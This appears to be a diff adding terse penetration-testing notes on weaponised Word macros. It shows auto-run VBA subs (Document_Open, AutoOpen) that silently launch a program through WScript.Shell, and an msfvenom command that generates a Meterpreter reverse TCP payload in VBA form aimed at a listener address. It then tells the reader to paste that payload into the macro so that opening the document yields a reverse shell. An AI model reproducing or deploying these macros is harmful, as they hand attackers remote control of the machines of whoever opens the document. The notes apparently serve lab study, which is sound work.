@@ -1,0 +1,36 @@
+' This auto opens the macro in word and pops whatever we wrote in the MsgBox
+
+Sub Document_Open()
+  shadab
+End Sub
+
+Sub AutoOpen()
+  shadab
+End Sub
+
+Sub Shadab()
+MsgBox ("Hello Everyone")
+End Sub
+
+----------------------------------------------------
+
+Sub Document_Open()
+  Exec
+End Sub
+
+Sub AutoOpen()
+  Exec
+End Sub
+Sub Exec()
+    Dim payload As String
+    payload = "calc.exe"
+    CreateObject("Wscript.Shell").Run payload, 0
+End Sub
+
+-----------------------------------------------------
+
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba
+
+copy the output and paste in macro (change Workbook to Document_Open())
+Ope opening the doc we get a reverse shell
